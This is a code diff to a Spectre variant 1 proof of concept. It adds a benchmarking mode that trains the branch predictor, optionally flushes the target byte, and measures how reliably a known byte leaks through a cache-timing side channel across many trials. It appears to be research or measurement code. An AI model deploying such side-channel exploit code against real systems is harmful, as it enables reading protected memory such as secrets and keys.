@@ -7,6 +7,8 @@
 #include <sys/mman.h>
 #include <x86intrin.h>
 
+#include "../common/probe.h"
+
 #ifndef PAGE_SIZE
 #define PAGE_SIZE 4096
 #endif
@@ -35,6 +37,8 @@ static unsigned char *array = public_array;
 static unsigned char *probe_buf;
 static volatile unsigned char temp = 0;
 static const char secret[] = "this is my super secret value!";
+static volatile unsigned char target_byte_storage = 0;
+alignas(64) static volatile unsigned char dummy_flush_byte = 0;
 
 __attribute__((noinline))
 static void victim(size_t x) {
@@ -119,16 +123,73 @@ void initialize_array() {
     }
 }
 
-static void train_then_attack(size_t malicious_x, unsigned int attempt) {
+__attribute__((noinline))
+static void train_then_attack(size_t malicious_x, unsigned int attempt,
+                              const void *flush_addr) {
     size_t training_x = attempt % ARRAY_SIZE;
 
     for (volatile int j = 0; j <= TRAIN_REPS; ++j) {
+        _mm_clflush(flush_addr);
+        _mm_lfence();
         size_t x = (j == TRAIN_REPS) ? malicious_x : training_x;
         victim(x);
     }
 }
 
-int main() {
+static int run_bench_byte(unsigned char target_value, int num_trials, int threshold,
+                          int flush_target) {
+    const int cpu = 0;
+    pin_cpu(cpu);
+    initialize_array();
+    target_byte_storage = target_value;
+    probe_buf = (unsigned char *)alloc_buf(NUM_PAGES);
+
+    uintptr_t diff = (uintptr_t)&target_byte_storage - (uintptr_t)array;
+    int order[SPECEXP_NUM_PAGES];
+    unsigned int lcg_state = 1;
+    const char *variant = flush_target ? "v1-flush" : "v1";
+
+    fprintf(stderr, "%s bench: target=0x%02x trials=%d threshold=%d\n",
+            variant, target_value, num_trials, threshold);
+    printf("variant,trial,outcome,leaked_value\n");
+
+    const int skip_low = ARRAY_SIZE + 1;
+    const void *flush_addr = flush_target ? (const void *)&target_byte_storage
+                                          : (const void *)&dummy_flush_byte;
+    for (int t = 0; t < num_trials; ++t) {
+        specexp_flush_buffer(probe_buf, (size_t)PAGE_SIZE * NUM_PAGES);
+        train_then_attack((size_t)diff, (unsigned int)t, flush_addr);
+        int found = specexp_probe_argmin(probe_buf, SPECEXP_NUM_PAGES, threshold,
+                                         skip_low, order, &lcg_state);
+        printf("%s,%d,%s,%d\n", variant, t, specexp_outcome(found, (int)target_value), found);
+    }
+    return 0;
+}
+
+int main(int argc, char **argv) {
+    int bench_mode = 0;
+    int flush_target = 0;
+    unsigned long target_value = 0xa5;
+    int num_trials = 10000;
+    int threshold = 120;
+
+    for (int i = 1; i < argc; ++i) {
+        if (!strcmp(argv[i], "--bench-byte") && i + 1 < argc) {
+            bench_mode = 1;
+            target_value = strtoul(argv[++i], nullptr, 0);
+        } else if (!strcmp(argv[i], "--trials") && i + 1 < argc) {
+            num_trials = atoi(argv[++i]);
+        } else if (!strcmp(argv[i], "--threshold") && i + 1 < argc) {
+            threshold = atoi(argv[++i]);
+        } else if (!strcmp(argv[i], "--flush-target")) {
+            flush_target = 1;
+        }
+    }
+
+    if (bench_mode) {
+        return run_bench_byte((unsigned char)target_value, num_trials, threshold, flush_target);
+    }
+
     const int cpu = 0;
     const int secret_len = (int)strlen(secret);
     char guessed[sizeof(secret)] = {};
@@ -151,7 +212,7 @@ int main() {
 
         for (int i = 0; i < ITERS; ++i) {
             flush_buffer(probe_buf, PAGE_SIZE * NUM_PAGES);
-            train_then_attack(malicious_x, (unsigned int)i);
+            train_then_attack(malicious_x, (unsigned int)i, (const void *)&dummy_flush_byte);
 
             int found = probe(probe_buf, NUM_PAGES, THRESHOLD, order, &lcg_state);
             if (found >= 0) {
